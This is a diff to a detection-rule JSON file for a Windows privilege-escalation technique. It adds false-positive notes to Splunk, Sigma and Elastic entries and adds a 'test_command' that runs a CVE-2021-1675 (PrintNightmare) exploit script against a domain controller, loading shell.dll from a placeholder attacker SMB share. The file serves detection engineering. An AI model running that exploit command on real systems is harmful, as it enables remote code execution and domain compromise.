@@ -90,7 +90,8 @@
           "T1068"
         ],
         "fidelity": "signature",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management"
       },
       {
         "platform": "splunk",
@@ -104,7 +105,8 @@
         "confidence": "medium",
         "log_ids": [
           "11"
-        ]
+        ],
+        "false_positives": "Backup software, AV scans, or IT deployment tools creating similar files"
       },
       {
         "platform": "splunk",
@@ -118,7 +120,8 @@
         "confidence": "medium",
         "log_ids": [
           "4688"
-        ]
+        ],
+        "false_positives": "Legitimate admin tools (PowerShell, cmd) used for maintenance"
       },
       {
         "platform": "sigma",
@@ -129,7 +132,8 @@
           "T1068"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Backup software, AV scans, or IT deployment tools creating similar files"
       },
       {
         "platform": "sigma",
@@ -140,7 +144,8 @@
           "T1068"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate system tools performing similar operations (e.g. admin scripts, management agents)"
       },
       {
         "platform": "elastic",
@@ -150,7 +155,9 @@
         "attack": [
           "T1068"
         ],
-        "fidelity": "behavioral"
+        "fidelity": "behavioral",
+        "false_positives": "Legitimate admin tools (PowerShell, cmd) used for maintenance",
+        "confidence": "high"
       }
     ],
     "visibility": {
@@ -190,7 +197,8 @@
         "Review PowerShell Script Block / Module Logs, Sysmon, Windows Security Event Log for surrounding context (5 min before/after)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "sudo python3 CVE-2021-1675.py <domain>/<user>:<password>@<dc_ip> '\\\\<attacker_ip>\\smb\\shell.dll'"
     }
   },
   "tools": [
